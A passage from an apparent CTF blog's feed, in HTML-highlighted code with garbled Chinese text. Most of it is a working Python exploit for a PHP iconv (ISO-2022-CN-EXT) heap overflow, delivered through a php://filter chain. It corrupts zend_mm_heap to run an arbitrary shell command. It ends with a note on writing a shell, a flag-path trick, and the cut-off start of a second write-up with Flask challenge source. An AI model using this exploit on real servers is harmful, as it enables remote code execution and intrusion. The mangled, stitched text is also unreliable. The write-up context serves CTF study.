class="token punctuation">(</span>step3<span class="token punctuation">)</span> <span class="token operator">==</span> CS        step3 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>        step3 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>        step3 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>        step3 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>            step3_overflow <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>step3_size <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>BUG<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> BUG        <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span> <span class="token operator">==</span> CS        step3_overflow <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>        step3_overflow <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>        step3_overflow <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>        step3_overflow <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>            step4_size <span class="token operator">=</span> CS        step4 <span class="token operator">=</span> <span class="token string">b"=00"</span> <span class="token operator">+</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>step4_size <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>        step4 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>        step4 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>        step4 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>        step4 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>            <span class="token comment"># This chunk will eventually overwrite mm_heap->free_slot</span>        <span class="token comment"># it is actually allocated 0x10 bytes BEFORE it, thus the two filler values</span>        step4_pwn <span class="token operator">=</span> ptr_bucket<span class="token punctuation">(</span>            <span class="token number">0x200000</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token comment"># free_slot</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            ADDR_CUSTOM_HEAP<span class="token punctuation">,</span>  <span class="token comment"># 0x18</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            ADDR_HEAP<span class="token punctuation">,</span>  <span class="token comment"># 0x140</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            size<span class="token operator">=</span>CS<span class="token punctuation">,</span>        <span class="token punctuation">)</span>            step4_custom_heap <span class="token operator">=</span> ptr_bucket<span class="token punctuation">(</span>            ADDR_EMALLOC<span class="token punctuation">,</span> ADDR_EFREE<span class="token punctuation">,</span> ADDR_EREALLOC<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x18</span>        <span class="token punctuation">)</span>            step4_use_custom_heap_size <span class="token operator">=</span> <span class="token number">0x140</span>            COMMAND <span class="token operator">=</span> self<span class="token punctuation">.</span>command        COMMAND <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"kill -9 $PPID; </span><span class="token interpolation"><span class="token punctuation">&#123;</span>COMMAND<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>sleep<span class="token punctuation">:</span>            COMMAND <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"sleep </span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>sleep<span class="token punctuation">&#125;</span></span><span class="token string">; </span><span class="token interpolation"><span class="token punctuation">&#123;</span>COMMAND<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        COMMAND <span class="token operator">=</span> COMMAND<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\x00"</span>            <span class="token keyword">assert</span> <span class="token punctuation">(</span>            <span class="token builtin">len</span><span class="token punctuation">(</span>COMMAND<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> step4_use_custom_heap_size        <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"Command too big (</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>COMMAND<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">), it must be strictly inferior to </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>step4_use_custom_heap_size<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        COMMAND <span class="token operator">=</span> COMMAND<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>step4_use_custom_heap_size<span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span>            step4_use_custom_heap <span class="token operator">=</span> COMMAND        step4_use_custom_heap <span class="token operator">=</span> qpe<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>            pages <span class="token operator">=</span> <span class="token punctuation">(</span>            step4 <span class="token operator">*</span> <span class="token number">3</span>            <span class="token operator">+</span> step4_pwn            <span class="token operator">+</span> step4_custom_heap            <span class="token operator">+</span> step4_use_custom_heap            <span class="token operator">+</span> step3_overflow            <span class="token operator">+</span> pad <span class="token operator">*</span> self<span class="token punctuation">.</span>pad            <span class="token operator">+</span> step1 <span class="token operator">*</span> <span class="token number">3</span>            <span class="token operator">+</span> step2_write_ptr            <span class="token operator">+</span> step2 <span class="token operator">*</span> <span class="token number">2</span>        <span class="token punctuation">)</span>            resource <span class="token operator">=</span> compress<span class="token punctuation">(</span>compress<span class="token punctuation">(</span>pages<span class="token punctuation">)</span><span class="token punctuation">)</span>        resource <span class="token operator">=</span> b64<span class="token punctuation">(</span>resource<span class="token punctuation">)</span>        resource <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>resource<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>            filters <span class="token operator">=</span> <span class="token punctuation">[</span>            <span class="token comment"># Create buckets</span>            <span class="token string">"zlib.inflate"</span><span class="token punctuation">,</span>            <span class="token string">"zlib.inflate"</span><span class="token punctuation">,</span>                        <span class="token comment"># Step 0: Setup heap</span>            <span class="token string">"dechunk"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.latin1.latin1"</span><span class="token punctuation">,</span>                        <span class="token comment"># Step 1: Reverse FL order</span>            <span class="token string">"dechunk"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.latin1.latin1"</span><span class="token punctuation">,</span>                        <span class="token comment"># Step 2: Put fake pointer and make FL order back to normal</span>            <span class="token string">"dechunk"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.latin1.latin1"</span><span class="token punctuation">,</span>                        <span class="token comment"># Step 3: Trigger overflow</span>            <span class="token string">"dechunk"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.UTF-8.ISO-2022-CN-EXT"</span><span class="token punctuation">,</span>                        <span class="token comment"># Step 4: Allocate at arbitrary address and change zend_mm_heap</span>            <span class="token string">"convert.quoted-printable-decode"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.latin1.latin1"</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span>        filters <span class="token operator">=</span> <span class="token string">"|"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>filters<span class="token punctuation">)</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/read=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>filters<span class="token punctuation">&#125;</span></span><span class="token string">/resource=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>resource<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>            <span class="token keyword">return</span> path        <span class="token decorator annotation punctuation">@inform</span><span class="token punctuation">(</span><span class="token string">"Triggering..."</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        path <span class="token operator">=</span> self<span class="token punctuation">.</span>build_exploit_path<span class="token punctuation">(</span><span class="token punctuation">)</span>        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>send<span class="token punctuation">(</span>path<span class="token punctuation">)</span>        <span class="token keyword">except</span> <span class="token punctuation">(</span>ConnectionError<span class="token punctuation">,</span> ChunkedEncodingError<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>                msg_print<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>sleep<span class="token punctuation">:</span>            msg_print<span class="token punctuation">(</span><span class="token string">"    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]"</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> start <span class="token operator">+</span> self<span class="token punctuation">.</span>sleep <span class="token operator">&lt;=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            msg_print<span class="token punctuation">(</span><span class="token string">"    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]"</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token comment"># Wrong heap, maybe? If the exploited suggested others, use them!</span>            msg_print<span class="token punctuation">(</span><span class="token string">"    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]"</span><span class="token punctuation">)</span>                msg_print<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">compress</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Returns data suitable for `zlib.inflate`.    """</span>    <span class="token comment"># Remove 2-byte header and 4-byte checksum</span>    <span class="token keyword">return</span> zlib<span class="token punctuation">.</span>compress<span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">b64</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> base64<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> misalign <span class="token keyword">and</span> payload<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Misaligned: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>data<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">return</span> payload<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">compressed_bucket</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Returns a chunk of size 0x8000 that, when dechunked, returns the data."""</span>    <span class="token keyword">return</span> chunked_chunk<span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">0x8000</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">qpe</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Emulates quoted-printable-encode.    """</span>    <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>x<span class="token punctuation">:</span><span class="token format-spec">02x</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span> <span class="token keyword">for</span> x <span class="token keyword">in</span> data<span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ptr_bucket</span><span class="token punctuation">(</span><span class="token operator">*</span>ptrs<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Creates a 0x8000 chunk that reveals pointers after every step has been ran."""</span>    <span class="token keyword">if</span> size <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ptrs<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">==</span> size    bucket <span class="token operator">=</span> <span class="token string">b""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span>p64<span class="token punctuation">,</span> ptrs<span class="token punctuation">)</span><span class="token punctuation">)</span>    bucket <span class="token operator">=</span> qpe<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    bucket <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    bucket <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    bucket <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    bucket <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    <span class="token keyword">return</span> bucket<span class="token keyword">def</span> <span class="token function">chunked_chunk</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> size<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Constructs a chunked representation of the given chunk. If size is given, the    chunked representation has size `size`.    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.    """</span>    <span class="token comment"># The caller does not care about the size: let's just add 8, which is more than</span>    <span class="token comment"># enough</span>    <span class="token keyword">if</span> size <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span>    keep <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token string">b"\n\n"</span><span class="token punctuation">)</span>    size <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token format-spec">x</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>size <span class="token operator">-</span> keep<span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> size<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\n"</span> <span class="token operator">+</span> data <span class="token operator">+</span> <span class="token string">b"\n"</span><span class="token decorator annotation punctuation">@dataclass</span><span class="token keyword">class</span> <span class="token class-name">Region</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""A memory region."""</span>    start<span class="token punctuation">:</span> <span class="token builtin">int</span>    stop<span class="token punctuation">:</span> <span class="token builtin">int</span>    permissions<span class="token punctuation">:</span> <span class="token builtin">str</span>    path<span class="token punctuation">:</span> <span class="token builtin">str</span>        <span class="token decorator annotation punctuation">@property</span>    <span class="token keyword">def</span> <span class="token function">size</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>stop <span class="token operator">-</span> self<span class="token punctuation">.</span>startExploit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç”±äºæœ¬äººçš„è„šæœ¬åŠŸåŠ›å®åœ¨æ˜¯çƒ‚ï¼Œæ”¹å®Œåçš„è„šæœ¬å…¶å®åº”è¯¥æœ‰ä¸å°‘å°é—®é¢˜ï¼Œä½†å¤§è‡´æ€è·¯å°±æ˜¯è¿™æ ·ï¼Œè¿è¡Œä¹‹åå°±å†™shelläº†</p><p>å¯æƒœé¶æœºå…³äº†ï¼Œæˆ‘ä¹Ÿæ‡’å¾—èµ·ä¸€ä¸ªé…ç½®å¥½çš„lampæœåŠ¡ï¼ˆ</p><h2 id="éé¢„æœŸ"><a href="#éé¢„æœŸ" class="headerlink" title="éé¢„æœŸ"></a>éé¢„æœŸ</h2><p>é€†å¤©äº†ï¼Œæ€ä¹ˆæœ‰äººèƒ½çˆ†å‡ºflagè·¯å¾„çš„ï¼š<code>file://localhost/ffffffllllllaaaaagggggggg</code></p><hr><h1 id="tomcom2"><a href="#tomcom2" class="headerlink" title="tomcom2"></a>tomcom2</h1>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/3C0vRu8Mtaj4tzOsj4lY_g&quot;&gt;https://mp.weixin.qq.com/s/3C0vRu8Mtaj4tzOsj4lY_g&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTFçº¿ä¸Šèµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
    <category term="ååºåˆ—åŒ–" scheme="http://c1oudfl0w0.github.io/blog/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="SSRF" scheme="http://c1oudfl0w0.github.io/blog/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>NepCTF 2024</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/08/24/NepCTF-2024/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/08/24/NepCTF-2024/</id>
    <published>2024-08-24T04:15:15.000Z</published>
    <updated>2024-08-31T06:15:22.111Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>php masterï¼Œé™¤äº†phpå…¶å®ƒéƒ½ä¸ä¼šï¼ˆ</p><p>å‚è€ƒwpï¼š</p><p><a href="https://chenxi9981.github.io/NepCTF_2024/">https://chenxi9981.github.io/NepCTF_2024/</a></p><p><a href="https://natro92.fun/posts/64a8e859">https://natro92.fun/posts/64a8e859</a></p><span id="more"></span><hr><h1 id="NepDoubleï¼ˆå¤ç°ï¼‰"><a href="#NepDoubleï¼ˆå¤ç°ï¼‰" class="headerlink" title="NepDoubleï¼ˆå¤ç°ï¼‰"></a>NepDoubleï¼ˆå¤ç°ï¼‰</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span>render_template_string<span class="token keyword">from</span> zipfile <span class="token keyword">import</span> ZipFile<span class="token keyword">import</span> os<span class="token keyword">import</span> datetime<span class="token keyword">import</span> hashlib<span class="token keyword">from</span> jinja2 <span class="token keyword">import</span> Environment<span class="token punctuation">,</span> FileSystemLoaderapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">,</span>template_folder<span class="token operator">=</span><span class="token string">'static'</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'MAX_CONTENT_LENGTH'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span>UPLOAD_FOLDER <span class="token operator">=</span> <span class="token string">'/app/uploads'</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span> <span class="token operator">=</span> UPLOAD_FOLDER<span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>UPLOAD_FOLDER<span class="token punctuation">)</span><span class="token punctuation">:</span>    os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>UPLOAD_FOLDER<span class="token punctuation">)</span>template_env <span class="token operator">=</span> Environment<span class="token punctuation">(</span>loader<span class="token operator">=</span>FileSystemLoader<span class="token punctuation">(</span><span class="token string">'static'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> autoescape<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span>template_name<span class="token punctuation">,</span> <span class="token operator">**</span>context<span class="token punctuation">)</span><span class="token punctuation">:</span>    template <span class="token operator">=</span> template_env<span class="token punctuation">.</span>get_template<span class="token punctuation">(</span>template_name<span class="token punctuation">)</span>    <span class="token keyword">return</span> template<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token operator">**</span>context<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">render_template_string</span><span class="token punctuation">(</span>template_string<span class="token punctuation">,</span> <span class="token operator">**</span>context<span class="token punctuation">)</span><span class="token punctuation">:</span>    template <span class="token operator">=</span> template_env<span class="token punctuation">.</span>from_string<span class="token punctuation">(</span>template_string<span class="token punctuation">)</span>    <span class="token keyword">return</span> template<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token operator">**</span>context<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token 